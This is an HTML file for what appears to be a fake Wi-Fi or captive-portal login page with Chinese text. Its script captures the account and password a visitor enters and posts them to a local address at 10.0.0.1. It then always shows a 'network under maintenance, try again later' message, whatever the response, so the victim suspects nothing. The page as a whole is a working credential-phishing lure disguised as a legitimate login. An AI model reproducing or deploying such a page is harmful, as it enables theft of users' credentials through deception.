<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>上网登录页</title>
</head>

<body>
    <div>
        <form id="loginForm" method="post" action="http://10.0.0.1/login">
            <button type="submit" value="登录">登录</button>
            <input type="text" maxlength="30" placeholder="账号 Account" id="username" autocomplete="off">
            <input type="password" maxlength="30" placeholder="密码 Password" id="password" autocomplete="off">
        </form>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function (e) {

            e.preventDefault();

            const user = document.getElementById("username").value;
            const pass = document.getElementById("password").value;

            fetch("http://10.0.0.1/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    username: user,
                    password: pass
                })
            })
                .then(res => res.text())
                .then(data => {

                    alert("网络维护中，请稍后再试");

                })
                .catch(err => {

                    alert("网络维护中，请稍后再试");

                });

        });
    </script>
</body>

</html>
